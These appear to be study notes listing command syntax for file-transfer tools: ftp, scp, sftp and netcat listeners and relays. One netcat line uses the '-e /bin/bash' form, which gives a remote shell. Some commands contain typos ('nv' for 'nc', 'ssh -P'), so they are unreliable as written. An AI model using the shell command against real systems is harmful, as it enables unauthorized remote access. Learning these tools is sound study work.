##########################################
          Data Transfer
##########################################
tftp - udp 69; very simple communication
ftp (21(control) 20(data))
  active- client initiates a connection to port 21, server initiates the data transfer
  passive- client initiates the connection and data transfer
  ### Demo ###
  ftp <ip>
  Name: (<ip>:name): <name>
  password:
  help
  active(default)
  passive
  pwd
  put <file>        #copy a file from the client to the server in the current dir
  ls
sftp - like ftp (interactive) but run over ssh (tcp 22)
ftps - file transfer protocol secure (tcp 443)
scp (tcp 22) - non interactive
          download a file: scp <user>@<ip>:<file> <dir>
          upload a file: scp <file> <user>@<ip>:<dir>
          copy file from rhost to rhost: scp -3 <user>@<srcip>:<filepath> <user>@<dstip>:<dir>
          recursivel copy a dir: scp -r <testdir> user@H2:
scp w/ alt SSHD
          download: ssh -P <altPort> <user>@<ip>:<file> <dir>
          upload: scp -P <altPort> <file> <user>@<ip>:<dir>
netcat - nc operates in the clear
          inbound/outbound connections
          send/receive data
          transfer files
                    nc <ip> <port> -e <cmd> (/bin/bash)
                    
                    nc -lvp <port>                #opens a listener on a box
                    nc <ip> <port>                #remotely connects to the listener
                    
                    nc -lvp <port> > <file>       #redirects the listener into a file
                    nc <ip> <port> < <file>       #puts the contents of the file onto the listener
netcat relays
          mkfifo <name> 
          nc -lp <port1> < <infile>                          #server listener
          nc -lp <port2> > <outfile>                         #client listener
          nc -l <port1> 0 < pipe | nc -l <port2> > pipe      #what ever is put into port 1 is output on port 2
4 Options:
          nv -lp 9001 0<mypipe|nc -lp 9002 1>mypipe
          nv -lp 9001 0<mypipe|nc H2 9002 1>mypipe
          nv H1 9001 0<mypipe|nc -lp 9002 1>mypipe
          nv H1 9001 0<mypipe|nc H2 9002 1>mypipe

          nc -lp <port> < infile        #setup a listener
          nc <ip> <port> > outfile      #connect to a listening port








